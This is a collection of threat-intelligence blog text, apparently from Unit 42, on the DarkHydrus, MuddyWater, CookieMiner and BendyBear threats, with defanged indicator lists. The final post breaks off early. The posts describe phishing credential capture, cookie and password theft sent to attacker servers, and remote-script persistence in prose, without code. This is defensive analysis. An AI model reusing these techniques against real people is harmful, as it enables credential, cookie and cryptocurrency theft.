{
    "e7420b1b3a0feac1b3c295edd6dabac8cfe780ce": [
        {
            "type": "paragraph",
            "content": [
                "Last week, Unit 42 released a blog on a newly named threat group called DarkHydrus that we observed targeting government entities in the Middle East.",
                "The attack that we discussed in our previous publication involved spear-phishing to deliver a PowerShell payload we call RogueRobin; however, we are aware of DarkHydrus carrying out a credential harvesting attack in June 2018.",
                "It also appears that this an ongoing campaign, as we have evidence of previous credential harvesting attempts using the same infrastructure dating back to the Fall of 2017.",
                "These attacks were targeting government entities and educational institutions in the Middle East.",
                "The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the attachedTemplate technique to load a template from a remote server.",
                "When attempting to load this remote template, Microsoft Office will display an authentication dialog box to ask the user to provide login credentials.",
                "When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials.",
                "Based on Unit 42s analysis, DarkHydrus used the open-source Phishery tool to create two of the known Word documents used in these credential harvesting attacks.",
                "As discussed in our previous blog, this further strengthens DarkHydrus use of the open source for their attack tools.",
                "A phishing attack to steal credentials like this is not new: US-CERT warned of the same technique by a different threat group in 2017.",
                "What is noteworthy is DarkHydrus use of an open-source tool to carry out targeted attacks against these entities in the Middle East, which is fitting of their reliance of open source tools and these attacks are consistent in terms of targeting with what we reported last week.",
                "Based on this, we can reasonably presume this group will continue to carry out attacks against these kinds of targets in the Middle East in the near-future."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Credential Harvesting Attack\nOn June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East.",
                "The attack involved a spear-phishing email with a subject of Project Offer and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment.",
                "When opened, the malicious Word document displays a dialog box that asks the user for their credentials, as seen in Figure 1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1.",
                "Authentication dialog box presented to the user when opening document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As you can see in Figure 1, the authentication prompt says Connecting to <redacted>. 0utl00k[.]net, which is a DarkHydrus C2 server.",
                "If the user enters their credentials in this dialog box and presses Ok, the credentials are sent to the C2 server via the URL https://<redacted>.0utl00k[.]net/download/template.docx.",
                "With the authentication dialog box gone, Word displays the contents of the document, which in this specific case was an empty document.",
                "While this document was empty, the authentication promptmay have made the targeted user more likelyto enter their credentials, thinking its necessary to view the contents of the document.",
                "DarkHydrus also created their C2 domain carefully in an attempt to further trick the targeted user to enter their credentials.",
                "Firstly, the redacted subdomain was the domain of the targeted educational institution.",
                "Also, the 0utl00k[.]net domain resembles Microsofts legitimate \"outlook.com domain that provides free email services, which also make the user less suspicious and more likely to enter their credentials.",
                "Some users may not even notice what domain the dialog states they are connecting to and habitually type their Windows credentials.",
                "We found two additional Word documents using the 0utl00k[.]net domain to harvest credentials, seen in Table 1.",
                "We first saw these related Word documents in September and November 2017, which suggests that DarkHydrus has been carrying out this credential harvesting campaign for almost a year."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1.",
                "Additional DarkHydrus Word documents used to steal credentials"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Both of these related documents use the attachedTemplate technique to steal credentials by sending them to a URL https://0utl00k[.]net/docs.",
                "Unlike the June 2018 document that displayed no content after credential theft, both of these documents displayed content that appears pertinent to the targeted organization.",
                "The September 2017 document displays an employee survey, which can be seen in Figure 2."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2. Employee survey displayed after credential theft"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3.",
                "We were unable to find the displayed document via open source research, which may suggest that the actor gathered this password handover form from a prior operation."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3. Password handover form displayed after credential theft"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150.",
                "This same infrastructure was discussed in the Campaign Analysis of our previous blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Phishery Tool\nWhile analyzing the three malicious Word documents, we determined that two of the documents were created using an open source tool called Phishery.",
                "The Phishery tool is capable of the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We were able to confirm that DarkHydrus used Phishery to create these Word documents by using the open source tool to create a document and host a C2 ourselves.",
                "The DarkHydrus document used in the June 2018 attacks had a remote template URL added, as seen in Figure 4."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4. Remote template URL seen in the DarkHydrus document from June 2018"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We were able to replicate the remote template path seen in Figure 4 by using Phishery to create a weaponized delivery document.",
                "Figure 5 shows Phisherys output to the command that injects a URL into a file named good_test.docx, which it will save the resulting file to bad_test.docx."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5.",
                "Phishery command used to create a document that has same remote template URL as DarkHydrus"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To confirm, we used Phisherys C2 server and opened DarkHydrus Word document from the June 2018 attacks.",
                "When presented with the authentication dialog box, we entered fakename and fakepass as credentials, as seen in Figure 6 and pressed enter."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6.",
                "Authentication dialog box with fake credentials entered"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On the C2 server, we observed Phishery receiving the inbound request and capturing the credentials, as seen in Figure 7.",
                "The C2 server was able to obtain the fakename and fakepass credentials entered into the authentication dialog box displayed when opening DarkHydrus Word document."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7. Output of Phishery C2 showing captured credentials"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nDarkHydrus is a threat group carrying out attack campaigns targeting organizations in the Middle East.",
                "We discovered DarkHydrus carrying out credential harvesting attacks that use weaponized Word documents, which they delivered via spear-phishing emails to entities within government and educational institutions.",
                "This threat group not only used the Phishery tool to create these malicious Word documents, but also to host the C2 server to harvest credentials.",
                "The use of Phishery further shows Dark Hydrus reliance on open source tools to conduct their operations.",
                "Palo Alto Networks customers are protectedfrom Dark Hydrus by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators of Compromise\nSamples\nd393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318\n9eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf49\n0b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Infrastructure\n0utl00k[.]net\n107.175.150[.]113\n195.154.41[.]150"
            ]
        }
    ],
    "34a5bfe310491f90a83102610321bbbcade89a57": [
        {
            "type": "paragraph",
            "content": [
                "Summary\nThis blog discusses targeted attacks against the Middle East taking place between February and October 2017 by a group Unit 42 is naming \"MuddyWater\".",
                "This blog links this recent activity with previous isolated public reporting on similar attacks we believe are related.",
                "We refer to these attacks as MuddyWater due to the confusion in attributing these attacks.",
                "Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related.",
                "The MuddyWater attacks are primarily against Middle Eastern nations.",
                "However, we have also observed attacks against surrounding nations and beyond, including targets in India and the USA.",
                "MuddyWater attacks are characterized by the use of a slowly evolving PowerShell-based firststage backdoor we call POWERSTATS.",
                "Despite broad scrutiny and reports on MuddyWater attacks, the activity continues with only incremental changes to the tools and techniques.\n\nIntroduction & Overview\nThe Palo Alto Networks Unit 42 research team recently came across a series of malicious files which were almost identical to those targeting the Saudi Arabian government previously discussed by MalwareBytes.",
                "Which in turn, closely resembles a previous article by Morphisec.",
                "These attacks have also been tracked by several other researchers on Twitter and elsewhere.",
                "The activity has been consistent throughout 2017 and, based on our analysis, targets or is suspected to target, entities in the following countries:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malicious documents were adjusted according to the target regions, often using the logos of branches of local government, prompting the users to bypass security controls and enable macros.",
                "An overview of the technical changes seen in the past year is given in the graphic below, note that raw IOCs present in this graphic can be found as text in the Appendix at the end of this article."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1.",
                "An overview of the delivery of POWERSTATS, C2 URLs used, and other changes in the malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MuddyWater in the Middle East\nThe attackers behind MuddyWater have been active throughout 2017, with targets across the Middle East and surrounding areas,examples of the decoy documents observed is given in Table 1.",
                "Of course, being named in a decoy document doesnt mean any of these organizations have been attacked themselves or are involved in the attacks: the MuddyWater actors are abusing the trust these organizations names and/or logos command for their malicious purposes."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 \u2013 Examples of the lure documents observed in the MuddyWater attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All of these documents we observed and outlined above are related via:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Based on these connections we can be confident that all the files and infrastructure we give in our appendices are related, since more than one of these can be used to link each of the samples discussed in each case.",
                "I download my tools from GitHub, and so do my victims.",
                "The tools used by the MuddyWater attackers have been well documented by the previously cited research and a common theme of previous reporting was the open source nature of much of the toolset used by MuddyWater:",
                "Meterpreter, Mimikatz, Lazagne, Invoke-Obfuscation etc..",
                "In some of their recent attack documents, the attackers also used GitHub as a hosting site for their custom backdoor, POWERSTATS.",
                "Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2.",
                "The POWERSTATS malware was compiled as an exe using PS2EXE.",
                "However, this was a minor anomaly, as it was only seen in this case: raw scripts being used in all other cases."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 \u2013 The GitHub profile for F0R3X containing both legitimate forked code and the binaries created by the attacker.",
                "Note that the username could be a small joke on the attackers\u2019 part regarding the attribution to FIN7."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Pwn one to pwn them all\nIn some of the instances we observed what appeared to be compromised accounts at third party organizations sending the malware.",
                "In one case, the attackers sent a malicious document which was nearly identical to a legitimate attachment which we observed later being sent to the same recipient.",
                "This indicates that the attackers stole and modified a legitimate document from the compromised user account, crafted a malicious decoy Word macro document using this stolen document and sent it to the target recipient who might be expecting the email from the original account user before the real sender had time to send it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This targeting of third party organizations to attack further targets is a risky move on the attackers part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Making sense of MuddyWater",
                "When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7.",
                "FIN7 is a threat actor group that is financially motivated with targets in the restaurant, services and financial sectors.",
                "Following the trail of existing public reporting, the tie to FIN7 is essentially made based on a download observed from a MuddyWater C2, of a non-public tool DNSMessenger.",
                "For example, Morphisec wrote:\nLater in our investigation, the same command server also delivered a variant of the DNS messenger similar to that described by Talos.",
                "The domain names differed but the script adheres to the same logic (including the logic function).",
                "The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE.",
                "The use of the DNSMessenger tool appears primarily linked to FIN7, with no other samples being attributable to MuddyWater.",
                "This led us to query the relationship between the newer attacks we were looking at and the alleged FIN7 link.",
                "As part of this research, we came up with the following hypotheses along with their likelihoods, and a rationale for each one.",
                "1)",
                "The FIN7 threat actor is also involved in espionage in the Middle East - Unlikely\nWhilst this may seem an attractive hypothesis to some, there are aspects on the technical side that simply dont add up.",
                "Primarily, there are significant disparities between FIN7 and MuddyWater, specifically in terms of:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity.",
                "2)",
                "The DNSMessenger malware is a shared tool, used by FIN7, MuddyWater and perhaps other groups - Unlikely\nWe have attempted to find examples of code available in public data sources that would generate the variation of the DNSMessenger malware and had little luck in doing so.",
                "Even though the code for DNSMessenger is publicly available following research into attackers published by 3rd parties, attackers would have to write the corresponding server side to use it, and as such they may well choose to use the public DNS_TXT_Pwnage.ps1 script instead.",
                "Despite this, based on the chain of analysis above we cannot discount the notion that DNSMessenger is shared by multiple attackers, including FIN7 and MuddyWater.",
                "3)",
                "There was a mistake in the original Morphisec analysis which linked these attacks to FIN7 - Possible\nLittle detail is given on the nature of how the connection between DNSMessenger and MuddyWater was discovered it isnt possible for us to verify this link.",
                "4)",
                "The attackers realized they were under investigation and planted a false flag - Possible\nThe attackers realized they were under investigation and planted a false flag on their C2 server, uploading a copy of the FIN7 DNSMessenger code which had been previously mentioned (and was since publicly available) by FireEye and delivering it to researchers to trick them into mis-attributing the campaign.",
                "Indeed, the sample shared by Morphisec on PasteBin is identical to the one dropped by the sample discussed in the FireEye FIN7 SEC campaign blog except for the final line.\n\nFinal thoughts\nWhilst we could conclude with confidence that the attacks discussed in this article are not FIN7 related, we were not able to answer many of our questions about the MuddyWater attacks.",
                "We are currently unable to make a firm conclusion about the origin of the attackers, or the specific types of information they seek out once on a network.",
                "In any case we will continue to track their activities to provide protections for our customers.",
                "We hope the analysis presented shows the importance of drawing your own conclusions based on the data available to you, not just taking the conclusions given in the public domain at face value.",
                "This is especially true when actors who rely on slightly modified (and publicly available) open source tools are in play.",
                "Copycat threat actors can easily mimic attackers who use open source tools which can confuse attribution efforts meaning more than one aspect of the attacks observed must be considered when clustering.",
                "On top of this, whilst the vast majority of threat analysis in the public domain is repeatable and correct, in some cases it can be difficult to verify the analysis available.",
                "When it is hard to reproduce the analysis the confidence in any conclusions drawn must be lower than it would otherwise be, since you cannot know for sure that what is stated is true.",
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "AutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the following tags:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix A  C2 Addresses"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "148.251.204[.]131\n144.76.109[.]88\n138.201.75[.]227\n\nCompromised Legitimate Sites\n106[.]187[.]38[.]21\narbiogaz[.]com\nazmwn[.]suliparwarda[.]com\nbangortalk[.]org[.]uk\nbest2[.]thebestconference[.]org\ncamco[.]com[.]pk\ncbpexbrasilia[.]com[.]br\ncgss[.]com[.]pk\ndiplomat[.]com[.]sa\nferibschat[.]eu\nghanaconsulate[.]com[.]pk\nmagical-energy[.]com\nmainandstrand[.]com\nriyadhfoods[.]com\nschool[.]suliparwarda[.]com\nsuliparwarda[.]com\ntmclub[.]eu\nwatyanagr[.]nfe[.]go[.]th\nwhiver[.]in\nwww[.]4seasonrentacar[.]com\nwww[.]akhtaredanesh[.]com\nwww[.]arcadecreative[.]com\nwww[.]armaholic[.]com\nwww[.]asan-max[.]com\nwww[.]autotrans[.]hr\nwww[.]dafc[.]co[.]uk\nwww[.]eapa[.]org\nwww[.]elev8tor[.]com\nwww[.]jdarchs[.]com\nwww[.]kunkrooann[.]com\nwww[.]mackellarscreenworks[.]com\nwww[.]mitegen[.]com\nwww[.]nigelwhitfield[.]com\nwww[.]pomegranates[.]org\nwww[.]ridefox[.]com\nwww[.]shapingtomorrowsworld[.]org\nwww[.]vanessajackson[.]co[.]uk\nwww[.]yaran[.]co\nwww[.]ztm[.]waw[.]pl\ncoa[.]inducks[.]org\nmhtevents[.]com\nskepticalscience[.]com\nwallpapercase[.]com\nwww[.]spearhead-training[.]com\n\nAppendix B  Related files"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix C  Proxy URLs found from POWERSTATS samples from October 2017 onwards\nhxxp://106[.]187[.]38[.]21/short_qr/work[.]php?c=\nhxxp://arbiogaz[.]com/upload/work[.]php?c=\nhxxp://azmwn[.]suliparwarda[.]com/wp-content/plugins/wpdatatables/panda[.]php?c=\nhxxp://azmwn[.]suliparwarda[.]com/wp-content/themes/twentyfifteen/logs[.]php?c=\nhxxp://bangortalk[.]org[.]uk/speakers[.]php?c=\nhxxp://best2[.]thebestconference[.]org/ccb/browse_cat[.]php?c=\nhxxp://camco[.]com[.]pk/Controls/data[.]aspx?c=\nhxxp://cbpexbrasilia[.]com[.]br/wp-content/plugins/wordpress-seo/power[.]php?c=\nhxxp://cbpexbrasilia[.]com[.]br/wp-includes/widgets/work[.]php?c=\nhxxp://cgss[.]com[.]pk/data[.]aspx?c=\nhxxp://diplomat[.]com[.]sa/wp-content/plugins/wordpress-importer/cache[.]php?c=\nhxxp://feribschat[.]eu/logs[.]php?c=\nhxxp://ghanaconsulate[.]com[.]pk/data[.]aspx?c=\nhxxp://magical-energy[.]com/css[.]aspx?c=\nhxxp://magical-energy[.]com/css/css[.]aspx?c=\nhxxp://mainandstrand[.]com/work[.]php?c=\nhxxp://riyadhfoods[.]com/css/edu[.]aspx?c=\nhxxp://riyadhfoods[.]com/jquery-ui/js/jquery[.]aspx?c=\nhxxp://school[.]suliparwarda[.]com/components/com_akeeba/work[.]php?c=\nhxxp://school[.]suliparwarda[.]com/plugins/editors/codemirror/work[.]php?c=\nhxxp://suliparwarda[.]com/includes/panda[.]php?c=\nhxxp://suliparwarda[.]com/layouts/joomla/logs[.]php?c=\nhxxp://suliparwarda[.]com/wp-content/plugins/entry-views/work[.]php?c=\nhxxp://suliparwarda[.]com/wp-content/themes/twentyfifteen/work[.]php?c=\nhxxp://tmclub[.]eu/clubdata[.]php?c=\nhxxp://watyanagr[.]nfe[.]go[.]th/e-office/lib/work[.]php?c=\nhxxp://watyanagr[.]nfe[.]go[.]th/watyanagr/power[.]php?c=\nhxxp://whiver[.]in/power[.]php?c=\nhxxp://www[.]4seasonrentacar[.]com/viewsure/data[.]aspx?c=\nhxxp://www[.]akhtaredanesh[.]com/d/file/sym/work[.]php?c=\nhxxp://www[.]akhtaredanesh[.]com/d/oschool/power[.]php?c=\nhxxp://www[.]arcadecreative[.]com/work[.]php?c=\nhxxp://www[.]armaholic[.]com/list[.]php?c=\nhxxp://www[.]asan-max[.]com/files/articles/css[.]aspx?c=\nhxxp://www[.]asan-max[.]com/files/articles/large/css[.]aspx?c=\nhxxp://www[.]autotrans[.]hr/index[.]php?c=\nhxxp://www[.]dafc[.]co[.]uk/news[.]php?c=\nhxxp://www[.]eapa[.]org/asphalt[.]php?c=\nhxxp://www[.]elev8tor[.]com/show-work[.]php?c=\nhxxp://www[.]jdarchs[.]com/work[.]php?c=\nhxxp://www[.]kunkrooann[.]com/inc/work[.]php?c=\nhxxp://www[.]mackellarscreenworks[.]com/work[.]php?c=\nhxxp://www[.]mitegen[.]com/mic_catalog[.]php?c=\nhxxp://www[.]nigelwhitfield[.]com/v2/work[.]php?c=\nhxxp://www[.]pomegranates[.]org/index[.]php?c=\nhxxp://www[.]ridefox[.]com/content[.]php?c=\nhxxp://www[.]shapingtomorrowsworld[.]org/category[.]php?c=\nhxxp://www[.]vanessajackson[.]co[.]uk/work[.]php?c=\nhxxp://www[.]yaran[.]co//wp-content/plugins/so-masonry/logs[.]php?c=\nhxxp://www[.]yaran[.]co/wp-includes/widgets/logs[.]php?c=\nhxxp://www[.]ztm[.]waw[.]pl/pop[.]php?c=\nhxxps://coa[.]inducks[.]org/publication[.]php?c=\nhxxps://mhtevents[.]com/account[.]php?c=\nhxxps://skepticalscience[.]com/graphics[.]php?c=\nhxxps://wallpapercase[.]com/wp-content/themes/twentyfifteen/logs[.]php?c=\nhxxps://wallpapercase[.]com/wp-includes/customize/logs[.]php?c=\nhxxps://www[.]spearhead-training[.]com//html/power[.]php?c=\nhxxps://www[.]spearhead-training[.]com/work[.]php?c="
            ]
        }
    ],
    "1291b6c4e361fc6dc9d79b6b7d634b96008e611c": [
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks Unit 42 recently discovered malware that we believe has been developed from OSX.DarthMiner, a malware known to target the Mac platform."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This malware is capable of stealing browser cookies associated with mainstream cryptocurrency exchanges and wallet service websites visited by the victims."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It also steals saved passwords in Chrome."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Finally, it seeks to steal iPhone text messages from iTunes backups on the tethered Mac."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "By leveraging the combination of stolen login credentials, web cookies, and SMS data, based on past attacks like this, we believe the bad actors could bypass multi-factor authentication for these sites."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If successful, the attackers would have full access to the victims exchange account and/or wallet and be able to use those funds as if they were the user themselves."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware also configures the system to load coinmining software on the system.",
                "This software is made to look like an XMRig-type coinminer, which is used to mine Monero.",
                "In fact, though, it loads a coinminer that mines Koto, a lesser-known cryptocurrency that is associated with Japan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Because of the way this malware attacks the cookies associated with exchanges, we have named this malware CookieMiner."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the following sections, we will first briefly introduce some background knowledge, and then dig into the technical details of the malwares behaviors."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Web cookies are widely used for authentication.",
                "Once a user logs into a website, its cookies are stored for the web server to know the login status.",
                "If the cookies are stolen, the attacker could potentially sign into the website to use the victims account.",
                "Stealing cookies is an important step to bypass login anomaly detection.",
                "If only the username and password are stolen and used by a bad actor, the website may issue an alert or request additional authentication for a new login.",
                "However, if an authentication cookie is also provided along with the username and password, the website might believe the session is associated with a previously authenticated system host and not issue an alert or request additional authentication methods."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A cryptocurrency exchange is a place to trade cryptocurrencies for other assets, such as other digital (crypto)currencies or conventional fiat money.",
                "Most modern cryptocurrency exchanges and online wallet services have multi-factor authentication.",
                "CookieMiner tries to navigate past the authentication process by stealing a combination of the login credentials, text messages, and web cookies.",
                "If the bad actors successfully enter the websites using the victims identity, they could perform fund withdrawals.",
                "This may be a more efficient way to generate profits than outright cryptocurrency mining.",
                "Furthermore, attackers could manipulate the cryptocurrency prices with large-volume buying and/or selling of stolen assets resulting in additional profits."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A rundown of CookieMiners behaviors (discussed in more detail in the following sections):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The CookieMiner attack begins with a shell script targeting MacOS.",
                "As shown in Figure 1, it copies the Safari browsers cookies to a folder, and uploads it to a remote server (46.226.108[.]171:8000).",
                "The server hosts the service curldrop (https://github[.]com/kennell/curldrop), which allows users to upload files with curl.",
                "The attack targets cookies associated with cryptocurrency exchanges that include Binance, Coinbase, Poloniex, Bittrex, Bitstamp, MyEtherWallet, and any website having blockchain in its domain name such as www.blockchain[.]com."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1. Code to steal web cookies"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Apples Safari is not the only web browser targeted.",
                "Google Chrome also attracts the threat actors attention due to its popularity.",
                "CookieMiner downloads a Python script named harmlesslittlecode.py to extract saved login credentials and credit card information from Chromes local data storage (Figure 2)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2. Malware extracts Chrome's secret data"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CookieMiner adopts techniques from the Google Chromium projects code for its decryption and extraction operations and abuses them.",
                "Google Chromium is an open-source version of the Google Chrome browser.",
                "By abusing these techniques, CookieMiner attempts to steal credit card information from major issuers, such as Visa, Mastercard, American Express, and Discover (Figure 3).",
                "The users saved login credentials are also stolen, including usernames, passwords, and the corresponding web URLs (Figure 4)."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3. CookieMiner extracts credit card information"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4. CookieMiner extracts login credentials"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CookieMiner reports all the wallet-related file paths to its remote server so it can later upload the files according to the C2 commands.",
                "These files usually include private keys of cryptocurrency wallets.",
                "If the victims use iTunes to backup files from iPhone to Mac (can be via Wi-Fi), their iPhone text messages (SMSFILE) will also be retrieved by the attackers (Figure 5)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5.",
                "Malware steals wallets, cookies, passwords and SMS"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "CookieMiner issues a series of commands to configure the victims machine to mine cryptocurrency and maintain persistence (Figure 6).",
                "The program xmrig2 is a Mach-O executable for mining cryptocurrency.",
                "As seen in Figure 7, the address k1GqvkK7QYEfMj3JPHieBo1m7FUkTowdq6H has considerable mining performance.",
                "It has been ranked as a top miner in the Maruru mining pool (koto-pool.work).",
                "The cryptocurrency mined is called Koto, which is a Zcash-based anonymous cryptocurrency.",
                "The has addresses in Figure 8 use the Yescrypt algorithm which is good for CPU miners but not ideal for GPU miners.",
                "This is ideal for malware as the victim hosts are not guaranteed to have discrete GPUs installed in them but are guaranteed to have a CPU available.",
                "However, the filename xmrig2 is usually used by Monero miners.",
                "We believe the malware authors may have intentionally used this filename to create confusion since the miner is actually mining the Koto cryptocurrency."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6. CookieMiner mines cryptocurrency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7 Mining performance of the worker"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For persistence and remote control, the script downloads another base64-encoded Python script from hxxps://ptpb[.]pw/OAZG.",
                "After several steps of de-obfuscation, we found the attackers using EmPyre for post-exploitation control.",
                "EmPyre is a Python post-exploitation agent built on cryptologically-secure communications and a flexible architecture.",
                "The attacker is able to send commands to the victims machine for remote control.",
                "Additionally, the agent checks if Little Snitch (an application firewall) is running on the victims host.",
                "If so, it will stop and exit."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware CookieMiner is intended to help threat actors generate profit by collecting credential information and mining cryptocurrency.",
                "If attackers have all the needed information for the authentication process, the multi-factor authentication may be defeated.",
                "Cryptocurrency owners should keep an eye on their security settings and digital assets to prevent compromise and leakage."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Customers of Palo Alto Networks are protected by WildFire that is able to automatically detect the malware.",
                "AutoFocususers can track this activity by using the StealCookietag."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c65e65207f6f9f8df05e02c893de5b3c04825ac67bec391f0b212f4f33a31e80 uploadminer.sh"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "485c2301409a238affc713305dc1a465afa9a33696d58e8a84e881a552b82b06",
                "harmlesslittlecode.py"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "27ccebdda20264b93a37103f3076f6678c3446a2c2bfd8a73111dbc8c7eeeb71 OAZG"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "91b3f5e5d3b4e669a49d9c4fc044d0025cabb8ebb08f8d1839b887156ae0d6dd com.apple.rig2.plist"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cdb2fb9c8e84f0140824403ec32a2431fb357cd0f184c1790152834cc3ad3c1b",
                "com.proxy.initialize.plist"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ede858683267c61e710e367993f5e589fcb4b4b57b09d023a67ea63084c54a05 xmrig2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C2 Information"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://ptpb[.]pw/OAZG"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "46.226.108[.]171"
            ]
        }
    ],
    "490fc116e34ba46411926edc8f3e022d1d1bf1f3": [
        {
            "type": "paragraph",
            "content": [
                "Highly malleable, highly sophisticated and over 10,000 bytes of machine code.",
                "This is what Unit 42 researchers were met with during code analysis of this bear of a file.",
                "The code behavior and features strongly correlate with that of the WaterBear malware family, which has been active since as early as 2009.",
                "Analysis by Trend Micro and TeamT5 unveiled WaterBear as a multifaceted, stage-two implant, capable of file transfer, shell access, screen capture and much more.",
                "The malware is associated with the cyber espionage group BlackTech, which many in the broader threat research community have assessed to have ties to the Chinese government, and is believed to be responsible for recent attacks against several East Asian government organizations.",
                "Due to the similarities with WaterBear, and the polymorphic nature of the code, Unit 42 named this novel Chinese shellcode BendyBear.",
                "It stands in a class of its own in terms of being one of the most sophisticated, well-engineered and difficult-to-detect samples of shellcode employed by an Advanced Persistent Threat (APT)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The BendyBear sample was determined to be x64 shellcode for a stage-zero implant whose sole function is to download a more robust implant from a command and control (C2) server.",
                "Shellcode, despite its name, is used to describe the small piece of code loaded onto the target immediately following exploitation, regardless of whether or not it actually spawns a command shell.",
                "At 10,000+ bytes, BendyBear is noticeably larger than most, and uses its size to implement advanced features and anti-analysis techniques, such as modified RC4 encryption, signature block verification, and polymorphic code."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample analyzed in this blog was identified by its connections to a malicious C2 domain published by Taiwan's Ministry of Justice Investigation Bureau in August 2020.",
                "It was discovered absent additional information regarding the exploit vector, potential victims or intended use."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers can be protected from the attacks outlined in this blog with the Next-Generation Firewall alongside DNS Security, URL Filtering and WildFire security subscriptions, and Cortex XDR."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At a macro level, BendyBear is unique in that it:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the following sections, we provide an in-depth technical breakdown of each of these capabilities."
            ]
        },
        {
            "type": "paragraph",
            "content": [
